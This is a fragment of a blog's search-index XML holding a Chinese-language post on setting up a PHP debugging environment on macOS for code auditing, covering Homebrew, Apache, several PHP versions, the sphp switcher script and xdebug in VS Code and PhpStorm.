      <link href="/2019/11/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/11/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="mac-mamp-xdebug"><a href="#mac-mamp-xdebug" class="headerlink" title="mac mamp + xdebug"></a>mac mamp + xdebug</h1><h2 id="install-required-libraries"><a href="#install-required-libraries" class="headerlink" title="install required libraries"></a>install required libraries</h2><pre><code class="angular2html">brew install openldap libiconv</code></pre><h2 id="apache2"><a href="#apache2" class="headerlink" title="apache2"></a>apache2</h2><pre><code class="angular2html">sudo apachectl stopsudo launchctl unload -w /System/Library/LaunchDaemons/org.apache.httpd.plist 2&gt;/dev/nullbrew install httpdsudo brew services start httpd</code></pre><h2 id="Multiple-Versions-PHP"><a href="#Multiple-Versions-PHP" class="headerlink" title="Multiple Versions PHP"></a>Multiple Versions PHP</h2><pre><code class="angular2html">brew tap exolnet/homebrew-deprecatedbrew install php@5.6brew install php@7.0brew install php@7.1brew install php@7.2brew install php@7.3</code></pre><h2 id="PHP-Switcher-Script-sphp"><a href="#PHP-Switcher-Script-sphp" class="headerlink" title="PHP Switcher Script (sphp)"></a>PHP Switcher Script (sphp)</h2><pre><code class="angular2html">curl -L https://gist.githubusercontent.com/rhukster/f4c04f1bf59e0b74e335ee5d186a98e2/raw &gt; /usr/local/bin/sphpchmod +x /usr/local/bin/sphp</code></pre><p>example:</p><pre><code class="angular2html">Switching to php@7.1Switching your shellUnlinking /usr/local/Cellar/php@5.6/5.6.40... 319 symlinks removedUnlinking /usr/local/Cellar/php@7.0/7.0.33... 0 symlinks removedUnlinking /usr/local/Cellar/php@7.1/7.1.32_1... 0 symlinks removedUnlinking /usr/local/Cellar/php@7.2/7.2.23... 0 symlinks removedUnlinking /usr/local/Cellar/php/7.3.10... 208 symlinks removedLinking /usr/local/Cellar/php@7.1/7.1.32_1... 25 symlinks createdIf you need to have this software first in your PATH instead consider running:  echo &#39;export PATH=&quot;/usr/local/opt/php@7.1/bin:$PATH&quot;&#39; &gt;&gt; ~/.zshrc  echo &#39;export PATH=&quot;/usr/local/opt/php@7.1/sbin:$PATH&quot;&#39; &gt;&gt; ~/.zshrcYou will need sudo power from now onSwitching your apache confRestarting apachePHP 7.1.32 (cli) (built: Oct  6 2019 20:44:48) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies    with Zend OPcache v7.1.32, Copyright (c) 1999-2018, by Zend TechnologiesAll done!</code></pre><p>切换为 php 5.6 ：<br><img src="../../../../img/2.jpg" alt=""></p><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><pre><code class="angular2html">pecl install xdebug</code></pre><p>随后在 vscode 或者 phpstorm 中配置 xdebug 即可。</p><h3 id="vscode-安装-xdebug-："><a href="#vscode-安装-xdebug-：" class="headerlink" title="vscode 安装 xdebug ："></a>vscode 安装 xdebug ：</h3><p>比较简单，直接安装 vscode 插件 phpdebug 即可，也不需要特别多的配置。</p><p><img src="../../../../img/3.jpg" alt=""><br><img src="../../../../img/4.jpg" alt=""></p><h3 id="phpstorm-安装-xdebug-："><a href="#phpstorm-安装-xdebug-：" class="headerlink" title="phpstorm 安装 xdebug ："></a>phpstorm 安装 xdebug ：</h3><p>相对复杂一点：</p><p><img src="../../../../img/5.png" alt=""><br><img src="../../../../img/6.png" alt=""><br><img src="../../../../img/7.png" alt=""></p><p>然后就可以开始尽情的代码审计了。<br><strong>没有断点，不用动态调试的代码审计，等于白给。</strong></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions" target="_blank" rel="noopener">https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
